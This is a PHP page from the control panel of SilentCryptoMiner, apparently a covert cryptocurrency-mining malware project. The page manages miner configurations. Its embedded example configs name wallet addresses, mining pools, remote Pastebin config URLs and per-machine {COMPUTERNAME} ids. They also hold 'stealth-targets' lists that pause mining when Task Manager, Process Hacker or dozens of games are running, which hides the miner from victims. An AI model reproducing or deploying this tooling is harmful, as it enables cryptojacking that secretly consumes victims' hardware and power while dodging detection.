<?php
/* Made by Unam Sanctam https://github.com/UnamSanctam */
require_once dirname(__DIR__, 1).'/security.php';
require_once dirname(__DIR__, 1).'/assets/php/templates.php';
$configID = getParam('id') ?: 1;

$configs = $base->unam_dbSelect(getConn(), 'configs', 'cf_configID, cf_name, cf_data', [], 0, 1);

$configoptions = '';
$currentconfig = [];
if($configs) {
    foreach ($configs as $configdata) {
        $configoptions .= "<option value='{$configdata['cf_configID']}' " . ($configdata['cf_configID'] == $configID ? 'selected' : '') . ">{$configdata['cf_name']}</option>";
        if($configdata['cf_configID'] == $configID){
            $currentconfig = $configdata;
        }
    }
}

function getConfigValue($key) {
    global $currentconfig;
    return $currentconfig[$key] ?? '';
}

echo unamtSection($larr['Configurations'],
    unamtRow(
        unamtCard('col-lg-6 col-xl-4', "<h4>{$larr['Add']} {$larr['Configuration']}</h4>", '',
            unamtFormContainer('config-add', 'api/ajax-actions.php',
                unamtFormGroup(unamtInput($larr['Name'], 'name')).
                unamtFormGroup(unamtTextarea("{$larr['Configuration']} JSON", 'data', "", ['extras' => 'style="height: 350px;"'])).
                unamtFormGroup(unamtSubmit($larr['Add']))
            , ['classes'=>'form-page-refresh'])
        ).
        unamtCard('col-lg-6 col-xl-4', "<h4>{$larr['Edit']} {$larr['Configuration']}</h4>", '',
            unamtFormGroup(unamtSelect("{$larr['Choose']} {$larr['Configuration']}", 'config', $configoptions, ['classes'=>'nav-select', 'extras'=>"data-page='configurations'"])).
            unamtFormContainer('config-update', 'api/ajax-actions.php',
                unamtFormGroup(unamtHidden('index', getConfigValue('cf_configID'))).
                unamtFormGroup(unamtTextarea("{$larr['Configuration']} JSON", 'data', getConfigValue('cf_data'), ['extras' => 'style="height: 350px;"'])).
                unamtRow(
                    unamtFormGroup(unamtSubmit($larr['Save']), ['classes'=>'col']).
                    unamtFormGroup(unamtAjaxButton($larr['Remove'], 'config-remove', $configID, ['classes'=>($configID == 1 || $configID == 2 ? 'disabled ' : '').' col btn-danger ajax-action-reload']), ['classes'=>'col'])
                )
            )
            ) .
            // EXAMPLES
            '<div class="col-lg-6 col-xl-4">
            <div class="card ">
                <div class="card-header">
                    <h4>Examples</h4>
                </div>
                <div class="card-body">
                    <div class="form-group">
                        <label>Choose Configuration</label>
                        <select name="config" class="form-control" id="selectExampleConfig" onchange="loadConfig()">
                            <option value="1" data-select2-id="6">Example xmrig</option>
                            <option value="2">Example ethminer (etc)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Configuration JSON</label>
                        <textarea id="textareaExample" type="text" class="form-control" name="data" style="height: 350px;"
                            disabled></textarea>
                    </div>
                    <div class="form-group" style="margin-bottom: 6px;">
                        <div>These examples are taken from the wiki. For more information, read the wiki: <a href="https://github.com/UnamSanctam/SilentCryptoMiner/wiki" target="_blank">Silent Crypto Miner Wiki</a></dib>
                    </div>
                </div>
            </div>
        </div>
        
        <script>
            var xmrExampleConfig = {
                "algo": "rx/0",
                "pool": "xmr.2miners.com",
                "port": 12222,
                "wallet": "8BbApiMBHsPVKkLEP4rVbST6CnSb3LW2gXygngCi5MGiBuwAFh6bFEzT3UTufiCehFK7fNvAjs5Tv6BKYa6w8hwaSjnsg2N.{COMPUTERNAME}",
                "password": "",
                "rig-id": "",
                "keepalive": false,
                "nicehash": false,
                "ssltls": true,
                "max-cpu": 20,
                "idle-wait": 5,
                "idle-cpu": 80,
                "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
                "kill-targets": "",
                "stealth-fullscreen": false,
                "remote-config": "https://pastebin.com/raw/mpRWix6f",
                "api-endpoint": "http://localhost/api/endpoint.php",
            };
        
            var ethExampleConfig = {
                "url": "stratums://`0xd513e80ECc106A1BA7Fa15F1C590Ef3c4cd16CF3`.{COMPUTERNAME}@etc.2miners.com:11010",
                "algo": "etchash",
                "max-gpu": 50,
                "idle-wait": 5,
                "idle-gpu": 90,
                "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,GenshinImpact.exe,FactoryGame.exe,Borderlands2.exe,EliteDangerous64.exe,PlanetCoaster.exe,Warframe.x64.exe,NMS.exe,RainbowSix.exe,RainbowSix_BE.exe,CK2game.exe,ck3.exe,stellaris.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ffxiv.exe,ffxiv_dx11.exe,GTA5.exe,FortniteClient-Win64-Shipping.exe,r5apex.exe,VALORANT.exe,csgo.exe,PortalWars-Win64-Shipping.exe,FiveM.exe,left4dead2.exe,FIFA21.exe,BlackOpsColdWar.exe,EscapeFromTarkov.exe,TEKKEN 7.exe,SRTTR.exe,DeadByDaylight-Win64-Shipping.exe,PointBlank.exe,enlisted.exe,WorldOfTanks.exe,SoTGame.exe,FiveM_b2189_GTAProcess.exe,NarakaBladepoint.exe,re8.exe,Sonic Colors - Ultimate.exe,iw6sp64_ship.exe,RocketLeague.exe,Cyberpunk2077.exe,FiveM_GTAProcess.exe,RustClient.exe,Photoshop.exe,VideoEditorPlus.exe,AfterFX.exe,League of Legends.exe,Falluot4.exe,FarCry5.exe,RDR2.exe,Little_Nightmares_II_Enhanced-Win64-Shipping.exe,NBA2K22.exe,Borderlands3.exe,LeagueClientUx.exe,RogueCompany.exe,Tiger-Win64-Shipping.exe,WatchDogsLegion.exe,Phasmophobia.exe,VRChat.exe,NBA2K21.exe,NarakaBladepoint.exe,ForzaHorizon4.exe,acad.exe,AndroidEmulatorEn.exe,bf4.exe,zula.exe,Adobe Premiere Pro.exe,GenshinImpact.exe",
                "kill-targets": "",
                "stealth-fullscreen": false,
                "remote-config": "https://pastebin.com/raw/rCQQyJSW",
                "api-endpoint": "http://localhost/api/endpoint.php",
            }
        
            function loadConfig() {
                selected = document.getElementById("selectExampleConfig").value
                if (selected == "1") {
                    document.getElementById("textareaExample").innerHTML = JSON.stringify(xmrExampleConfig, null, 4)
                }
                else if (selected == "2") {
                    document.getElementById("textareaExample").innerHTML = JSON.stringify(ethExampleConfig, null, 4)
                }
            }
        
            loadConfig()
        </script>'
        )
    );
